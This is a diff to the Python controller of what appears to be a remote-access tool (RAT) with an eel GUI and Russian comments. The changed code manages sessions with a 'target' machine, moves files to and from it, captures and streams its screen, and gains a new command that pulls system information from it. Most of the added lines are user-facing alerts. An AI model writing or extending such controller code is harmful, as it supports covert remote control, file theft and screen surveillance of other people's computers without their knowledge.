@@ -67,9 +67,10 @@ def upload_file(target, file_name):
 		f = open(file_name, 'rb')
 		target.send(f.read())
 		#f.close()
+		eel.alert_message('Файл успешно загружен')
 
 def download_file(target, file_name):
-		# Файл бинарный, поэтому нужно исп wb
+		# Файл бинарный, поэтому нужно исп wb 
 		f = open('download/' + file_name, 'wb')
 		# Чтобы обнаржуить окончание загрузки файла
 		# выставляем таймаут
@@ -85,6 +86,10 @@ def download_file(target, file_name):
 		# Выставялем timeout=None, чтобы не было пролем с другими функциями
 		target.settimeout(None)
 		f.close()
+		eel.alert_message('Файл успешно загружен, \
+												если с ним есть какие-то проблемы (нечитаемые буквы), \
+												попробуйте изменить его кодировку')
+
 
 # Сделать скриншот все равно, что загрузить картинку с другого компьютера
 def screenshot(target, num):
@@ -200,6 +205,9 @@ def solo_command(session_num, command):
 						count += 1
 				elif command[:13] == 'screen_stream':
 						open_stream(target)
+				elif command[:15] == 'get_system_info':
+						result = reliable_recv(target).split(',')
+						print_list_to_html(result)
 				elif command == 'help':
 						output_to_html('''<br>
 							quit								--> Quit Session With Target<br>
